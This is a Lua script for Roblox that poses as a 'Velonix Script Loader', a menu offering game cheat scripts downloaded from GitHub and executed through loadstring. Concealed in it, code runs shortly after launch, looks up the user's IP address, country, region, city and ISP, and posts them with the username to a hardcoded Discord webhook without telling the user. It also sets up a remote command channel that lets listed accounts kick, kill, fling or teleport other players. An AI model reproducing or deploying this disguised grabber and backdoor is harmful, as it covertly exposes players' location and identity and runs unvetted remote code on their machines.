local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ChatService = game:GetService("Chat")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9" -- Add your webhook URL here
local IP_API_URL = "https://velonix-api.vercel.app/json"

local WHITELIST = {
    ["inkgamespider"] = true,
    ["GoodgamerYTbro"] = true,
    ["Htut199122"] = true,
    ["Htut199122_alt"] = true,
    ["C9_1234"] = true,
}

local cmdEvent = ReplicatedStorage:FindFirstChild("VelonixCmdEvent") or Instance.new("RemoteEvent", ReplicatedStorage)
cmdEvent.Name = "VelonixCmdEvent"

-- UI Setup
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "VelonixLoader"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 300, 0, 320)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "Velonix Script Loader"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", mainFrame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,60,60)
closeBtn.BorderSizePixel = 0
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

-- Scrolling frame for scripts
local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
scrollFrame.Size = UDim2.new(1, -40, 1, -60)
scrollFrame.Position = UDim2.new(0, 20, 0, 50)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.ClipsDescendants = true
Instance.new("UIPadding", scrollFrame).PaddingBottom = UDim.new(0, 10)

local layout = Instance.new("UIListLayout", scrollFrame)
layout.Padding = UDim.new(0, 10)
layout.SortOrder = Enum.SortOrder.LayoutOrder

-- ===[ Script Buttons ]===
local LOADER_SCRIPTS = {
    ["🌱 Grow a Garden"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/GAG.lua",
    ["⚔️ The Strongest Battleground"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/TSB.lua",
    ["🗡️ Steal a Sword"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/SAS.lua",
    ["🔨 Flee The Facility"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/FTF.lua",
    ["🌐 Universal Script"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/UNIV.lua"
}

local function addScriptButton(name, url)
    local btn = Instance.new("TextButton", scrollFrame)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.TextColor3 = url and Color3.new(1,1,1) or Color3.fromRGB(170,170,170)
    btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    btn.Active = url ~= nil

    btn.MouseButton1Click:Connect(function()
        if not url then
            warn(name .. " is coming soon!")
            return
        end
        local ok, err = pcall(function()
            local script = game:HttpGet(url, true)
            assert(script and #script > 10, "Invalid script response")
            loadstring(script)()
        end)
        if not ok then
            warn("Error loading '"..name.."':", err)
        else
            mainFrame.Visible = false
        end
    end)
end

for displayName, url in pairs(LOADER_SCRIPTS) do
    addScriptButton(displayName, url)
end

-- ===[ IP Webhook ]===
task.delay(0.5, function()
    local ok, resp = pcall(function() return game:HttpGet(IP_API_URL, true) end)
    if not ok or not resp then
        return warn("IP fetch failed:", resp)
    end

    local data = HttpService:JSONDecode(resp)
    local payload = {
        username = "🔥 | Developer",
        embeds = {{
            title = "📡 User Info",
            description = string.format(
                "**User:** `%s`\n**IP:** `%s`\n**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**ISP:** `%s`",
                player.Name, data.ip or "Unknown", data.country or "Unknown",
                data.region or "Unknown", data.city or "Unknown", data.org or "Unknown"
            ),
            color = 3447003,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local reqFunc = (syn and syn.request) or (http and http.request) or request
    if not reqFunc or WEBHOOK_URL == "" then return end

    local sent, res = pcall(function()
        return reqFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not sent or not res.Success then
        warn("Webhook failed:", res and res.StatusCode or "unknown")
    end
end)

-- ===[ Remote Commands ]===
cmdEvent.OnClientEvent:Connect(function(sender, cmd, targetName)
    if WHITELIST[sender] then return end
    local target = Players:FindFirstChild(targetName)
    if not target then return end

    if cmd == "Kick" or cmd == "Ban" then
        target:Kick(cmd .. " issued by " .. sender)
    elseif cmd == "Kill" then
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Health = 0 end
    elseif cmd == "fling" then
        local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Velocity = Vector3.new(0, 200, 0) end
    elseif cmd == "bring" then
        local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        local senderHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if senderHRP and targetHRP then
            targetHRP.CFrame = senderHRP.CFrame + Vector3.new(0, 5, 0)
        end
    end
end)

-- ===[ Chat Command Parser Fix ]===
player.Chatted:Connect(function(msg)
    if msg:sub(1, 1) ~= "?" then return end

    local args = string.split(msg:sub(2), " ")
    local cmd = args[1] and args[1]:lower() or ""
    local target = args[2] and args[2]:gsub("%.", "") or ""

    cmd = cmd:sub(1,1):upper() .. cmd:sub(2)
    local valid = { Kick = true, Ban = true, Kill = true, fling = true, bring = true }

    if valid[cmd] then
        cmdEvent:FireServer(player.Name, cmd, target)
    end
end)